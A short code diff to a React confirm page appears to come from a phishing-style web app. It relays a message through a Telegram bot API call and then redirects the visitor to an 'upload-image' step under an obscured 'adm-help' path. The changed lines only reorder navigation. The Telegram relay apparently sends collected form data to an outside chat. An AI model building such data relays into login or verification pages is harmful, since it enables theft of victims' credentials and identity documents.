@@ -97,10 +97,10 @@ const ConfirmComponent = () => {
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
             .then((response) => {
+                navigate('/adm-help-100367483467364783748763/upload-image');
             })
             .catch((error) => {});
 
-            navigate('/adm-help-100367483467364783748763/waitting');
         }
 
     };
